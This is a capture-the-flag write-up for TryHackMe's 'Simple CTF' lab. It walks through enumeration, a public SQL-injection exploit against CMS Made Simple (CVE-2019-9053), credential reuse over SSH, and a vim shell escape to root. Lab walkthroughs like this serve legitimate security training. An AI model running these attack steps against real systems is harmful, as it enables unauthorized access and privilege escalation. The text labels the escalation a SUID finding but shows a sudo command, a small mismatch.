# Simple CTF -- TryHackMe Writeup -- Enumeration, Exploitation, and Privilege Escalation

## Target

- IP Address: `10.201.47.23`

---

## Nmap Enumeration

Initial scan to identify open ports:

```bash
nmap -sS 10.201.47.23
```

**Results:**

- 21/tcp → FTP (vsftpd 3.0.3)
- 80/tcp → HTTP (Apache 2.4.18)
- 2222/tcp → SSH (OpenSSH, non-standard port)

Follow-up scan for service details:

```bash
nmap -sC -sV -p 21,80 10.201.47.23
```

**Findings:**

- FTP allows **anonymous login**
- HTTP has a `/robots.txt` with hidden entries
- Apache default page is displayed

---

## Web Enumeration

Used Gobuster for directory brute-forcing:

```bash
gobuster dir -u http://10.201.47.23 -w /usr/share/wordlists/dirb/common.txt
```

**Interesting directories:**

- `/robots.txt`
- `/simple` → Running CMS Made Simple v2.2.8

Browsing `/simple` showed a login page and CMS version 2.2.8.

---

## Exploitation

CMS Made Simple v2.2.8 is vulnerable to **SQL Injection** ([CVE-2019-9053](https://www.exploit-db.com/exploits/46635)).

Ran the public exploit:

```bash
python3 exploit.py -u http://10.201.47.23/simple/
```

**Looted credentials:**

- Salt: `1dac0d92e9fa6bb2`
- Username: `mitch`
- Email: `admin@admin.com`
- Hash: `0c01f4468bd75d7a84c7eb73846e8d96`
- Password: `secret`

These credentials work for the CMS panel but deeper access is required.

---

## FTP Access

Logged in with anonymous FTP:

```bash
ftp 10.201.47.23
```

Inside the `pub` directory, found `ForMitch.txt`:

```
Dammit man... you're the worst dev I've seen. You set the same pass for the system user...
```

This hint confirms that the **system user `mitch` uses the same password (`secret`)**.

---

## SSH Access

SSH is running on port `2222`:

```bash
ssh mitch@10.201.47.23 -p 2222
```

Login successful with credentials:

```
Username: mitch
Password: secret
```

---

## Privilege Escalation

Checked for SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Ran **LinPEAS** for further enumeration.  

Identified `/usr/bin/vim` as a potential escalation vector.  
According to [GTFOBins](https://gtfobins.github.io/gtfobins/vim/#suid), root shell can be obtained by:

```bash
sudo vim -c ':!/bin/sh'
```

---

## Root Access

Successfully escalated privileges to root.  

Final flag located at:

```bash
/root/root.txt
```

---

## Key Takeaways

- Always enumerate thoroughly; FTP anonymous access revealed critical hints.
- Research CMS versions for known exploits.
- Weak developer practices (reusing credentials) enable lateral movement.
- GTFOBins is invaluable for privilege escalation.
